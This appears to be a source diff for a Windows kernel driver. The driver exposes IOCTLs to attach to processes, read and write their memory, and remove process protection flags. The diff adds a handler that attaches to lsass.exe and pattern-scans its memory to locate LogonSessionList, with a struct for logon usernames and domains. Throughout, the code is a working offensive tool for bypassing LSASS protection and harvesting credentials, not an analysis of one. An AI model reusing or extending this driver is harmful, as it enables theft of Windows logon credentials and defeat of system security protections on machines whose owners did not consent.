@@ -1,12 +1,21 @@
 #include <ntifs.h>
 #include <ntddk.h>
 #include <wdm.h>
+#include <stdarg.h>
 //////////////////////////////////////////////////////////////////////////////////
 //We need to start by getting undocumented functions 
 //:57
 
 //0x1 bytes (sizeof)
 //https://www.vergiliusproject.com/kernels/x86/windows-8.1/rtm/_PS_PROTECTION
+
+
+
+typedef struct _USER_LOGON_SESSION {
+	WCHAR UserName[64];
+	WCHAR Domain[64];
+} USER_LOGON_SESSION;
+
 
 typedef struct _PS_PROTECTION //offset = 0x87a from EPROCESS according to vergiliusproject
 //confirmed this in windbg with dt _eprocess ->
@@ -44,15 +53,22 @@ extern "C" { //run some C in cpp
 	NTKERNELAPI NTSTATUS MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);
 }
 
+#define DEBUG
 
-void debug_printer(PCSTR text) {
 
-#ifndef DEBUG
-	UNREFERENCED_PARAMETER(text);
-#endif //debug
+VOID debug_printer(_In_ PCSTR fmt, ...)
+{
+#ifdef DEBUG
+	va_list args;
+	va_start(args, fmt);
 
-	//KdPrint(Ex) only prints in compiled debug mode jsyk.
-	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
+	// vDbgPrintEx handles variable arguments safely
+	vDbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, fmt, args);
+
+	va_end(args);
+#else
+	UNREFERENCED_PARAMETER(fmt);
+#endif
 }
 
 
@@ -61,7 +77,6 @@ namespace driver {
 		//IOCTL codes - drivers to communicate w/ usermode apps and vice versa. 
 		//UserMode applications call DeviceIoControl to send a struct -> drivers.
 		//Then we recieve the struct and do whatever we want with it.
-
 
 		//Must be buffered IO so we can send buffers between kernel and userland.
 
@@ -77,6 +92,8 @@ namespace driver {
 
 		constexpr ULONG protect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.
 
+		constexpr ULONG lssl = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.
+
 	}
 
 	struct Request {
@@ -85,8 +102,10 @@ namespace driver {
 		PVOID pBuffer;
 		SIZE_T sSize;
 		SIZE_T sReturn_size;
+		PVOID pBase;
+		PVOID pEnd;
+		ULONG_PTR offset;
 	};
-
 	//3 functinos for uDriverOBject event handleing.
 
 	NTSTATUS create(PDEVICE_OBJECT pDeviceObject, PIRP irp) { 		//irp is the packet that carries the data between ICTL devices.
@@ -99,6 +118,66 @@ namespace driver {
 		IoCompleteRequest(irp, IO_NO_INCREMENT); //every time we complete an IRP / complete incoming packet request, we must call this.
 		return irp->IoStatus.Status; //OS/User can both see what status is when these handlers are called.
 	}
+
+
+    #define CHUNK_SIZE 4096
+
+	// Compare 12 bytes at base with pattern
+	bool compare12(UCHAR* base, UCHAR pattern[12]) {
+		for (int i = 0; i < 12; i++) {
+			if (base[i] != pattern[i])
+				return false;
+		}
+		return true;
+	}
+
+	// Scan memory from pBase to pEnd in chunks for the pattern
+	ULONG_PTR patternScanner(PVOID pBase, PVOID pEnd) {
+		UCHAR pattern[12] = {0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74};
+		const size_t patternLength = sizeof(pattern);
+
+		UCHAR* start = (UCHAR*)pBase;
+		UCHAR* end = (UCHAR*)pEnd;
+
+		for (UCHAR* chunkStart = start; chunkStart + patternLength <= end; chunkStart += (CHUNK_SIZE - (patternLength - 1))){
+			size_t remaining = end - chunkStart;
+			
+			size_t scanSize;
+
+			if (remaining < CHUNK_SIZE)
+				scanSize = remaining;
+			else
+				scanSize = CHUNK_SIZE;
+
+
+			if (scanSize < 12) break; // nothing left to scan
+
+			__try {
+				for (size_t j = 0; j <= scanSize - 12; j++) {
+					if (compare12(chunkStart + j, pattern)) {
+						debug_printer("FOUND IT! Setting offset....\n");
+						
+						ULONG_PTR address = (ULONG_PTR)(chunkStart + j);
+						ULONG offset = (ULONG)(((UCHAR*)chunkStart + j) - (UCHAR*)pBase);
+						DbgPrint("Win1803 Location: 0x%p\n", (PVOID)address);
+						DbgPrint("Offset Location: 0x%llu\n", (unsigned long long)offset);
+
+						return address; // pattern found
+					}
+				}
+			}
+			__except (EXCEPTION_EXECUTE_HANDLER) {
+				// Skip this chunk safely
+				debug_printer("Exception handler for pattern search...\n");
+
+			}
+
+			KeShouldYieldProcessor(); // Yield CPU to avoid watchdog timeout
+		}
+
+		return 0; // pattern not found
+	}
+
 
 	//everytime we call DeviceIoControl (send stuff to kernel) this is called.  This is where read/write/attach comes in.
 	NTSTATUS device_control(PDEVICE_OBJECT pDeviceObject, PIRP irp) { 		//irp is the packet that carries the data between ICTL devices.
@@ -129,6 +208,7 @@ namespace driver {
 		case codes::attach:
 			status = PsLookupProcessByProcessId(request->hPID, &target_process);
 			psProtection = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)target_process) + 0x87a);
+
 			break;
 		case codes::read:
 			//we need to have a target process before we cna read proc mem
@@ -144,7 +224,7 @@ namespace driver {
 		case codes::write:
 
 			if (target_process != nullptr) {
-				status = MmCopyVirtualMemory(PsGetCurrentProcess(), request->pBuffer, target_process, request->pTargetMemory, //copy memory from target -> driver
+				status = MmCopyVirtualMemory(PsGetCurrentProcess(), request->pBuffer, target_process, request->pTargetMemory,
 					request->sSize, KernelMode, &request->sReturn_size);
 			}
 			break;
@@ -165,6 +245,56 @@ namespace driver {
 				debug_printer("Removed signature and protection...\n");
 				status = STATUS_SUCCESS;
 
+			}
+			break;
+		case codes::lssl:
+			//we need to have a target process before we cna read proc mem
+			debug_printer("Entering find lsl...\n");
+			
+			
+			
+			debug_printer("Setting passive...\n");
+			if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
+				request->offset = 0;
+				status = STATUS_INVALID_DEVICE_STATE;
+				break;
+			}
+
+
+			debug_printer("IRQL level = passive...\n");//IRQL passive means this is just a normal thread, the CPU can interupt it for 
+													   //more important tasks since our byte scanner might take a while...
+
+			if (target_process != nullptr) {
+				//Attach to lsass.exe so that we can better reference mem space
+				debug_printer("Attaching...\n");
+				KAPC_STATE apc;
+				KeStackAttachProcess(target_process, &apc);
+				debug_printer("Attached!...\n");
+				_try{
+					_try{
+						//now that we're attached all reference in memory go through lsass.exe
+						ULONG_PTR pLogonSessionListOffset = patternScanner(request->pBase, request->pEnd);
+						debug_printer("Done searching for pattern...\n");
+
+						if (pLogonSessionListOffset != NULL) {
+							request->offset = pLogonSessionListOffset;
+							debug_printer("Found lsl offset???!!!! <-----\n...");
+							DbgPrint("Pointer (from try) : 0x%p", (PVOID)pLogonSessionListOffset);
+
+							status = STATUS_SUCCESS;
+						}
+						else {
+							debug_printer("lsl offset not found... :( \n...");
+							request->offset = 0;
+						}
+					}
+					_except(EXCEPTION_EXECUTE_HANDLER) {
+						request->offset = 0;
+					}
+				}
+				_finally{
+					KeUnstackDetachProcess(&apc); // Detach when finished 
+				}
 			}
 			break;
 
